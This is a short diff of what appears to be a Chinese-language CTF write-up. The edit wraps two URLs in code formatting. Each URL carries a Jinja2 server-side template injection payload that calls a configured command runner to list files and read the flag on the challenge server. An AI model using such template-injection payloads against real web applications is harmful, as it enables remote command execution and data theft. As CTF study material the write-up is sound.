@@ -182,9 +182,9 @@ rotected的参数变成 \00*\00test3
 
 於是
 
-http://140.110.112.29:1008/?name={{ config['RUNCMD']('ls -alh',shell=True) }}
+`http://140.110.112.29:1008/?name={{ config['RUNCMD']('ls -alh',shell=True) }}`
 
-http://140.110.112.29:1008/?name={{ config['RUNCMD']('cat flag',shell=True) }}
+`http://140.110.112.29:1008/?name={{ config['RUNCMD']('cat flag',shell=True) }}`
 
 [參考文章](https://hellohxk.com/blog/ssti/)
 
